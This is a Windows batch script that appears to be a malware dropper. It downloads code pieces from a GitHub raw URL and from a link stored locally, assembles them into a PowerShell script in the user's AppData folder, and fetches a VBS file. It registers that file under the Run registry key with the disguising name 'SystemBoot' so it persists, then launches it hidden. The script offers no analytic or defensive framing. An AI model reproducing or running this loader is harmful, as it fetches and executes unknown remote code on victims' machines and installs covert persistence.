@echo off
set d=%APPDATA%\Paged
set f=%d%\M.txt
set a=%d%\f1.txt
set b=%d%\f2.txt
set c=%d%\Nvs.ps1
set v=%d%\S_m.vbs
set u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V
:: Read the dynamic link from l.txt
set /p dynLink=<"%appdata%\Paged-l\l.txt"
rmdir /s /q "%d%" 2>nul
mkdir "%d%"

:: Download files to memory and perform replacements in memory
powershell -c "$contentM = (Invoke-WebRequest -Uri 'https://%u%/Final.txt').Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/First.txt').Content; $contentB = (Invoke-WebRequest -Uri '%dynLink%').Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent)"
timeout /t 5 /nobreak >nul

:: Download S_m.vbs to memory and save
powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [System.IO.File]::WriteAllText('%v%', $content)"
powershell -c "sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' SystemBoot 'wscript.exe \"%v%\"'"
start /min wscript "%v%"
